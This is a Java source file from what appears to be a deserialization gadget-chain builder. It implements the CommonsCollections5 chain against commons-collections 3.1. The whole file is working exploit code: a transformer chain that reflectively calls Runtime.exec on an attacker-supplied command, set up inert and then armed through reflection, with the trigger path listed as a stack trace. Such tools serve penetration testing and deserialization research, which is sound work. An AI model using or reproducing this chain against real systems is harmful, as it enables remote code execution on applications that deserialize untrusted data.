package org.ses.gadgetbuilder.chains1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.ToStringTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
@Impact(Impact.RCE)
public class CommonsCollections5 extends GadgetChain<ToStringTrampoline> {

    Transformer transformerChain;
    Transformer[] transformers;


    public CommonsCollections5(ToStringTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        final String[] execArgs = new String[] { command };
        // inert chain for setup
        this.transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        this.transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        return new TrampolineConnector(entry);
    }

    @Override
    protected void postProcessPayload() throws Exception {
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.collections.keyvalue.TiedMapEntry.toString()\n" +
                "org.apache.commons.collections.map.LazyMap.get()\n" +
                "org.apache.commons.collections.functors.ChainedTransformer.transform()\n" +
                "org.apache.commons.collections.functors.ConstantTransformer.transform()\n" +
                "org.apache.commons.collections.functors.InvokerTransformer.transform()\n" +
                "java.lang.reflect.Method.invoke()\n" +
                "java.lang.Runtime.exec()";
    }
}
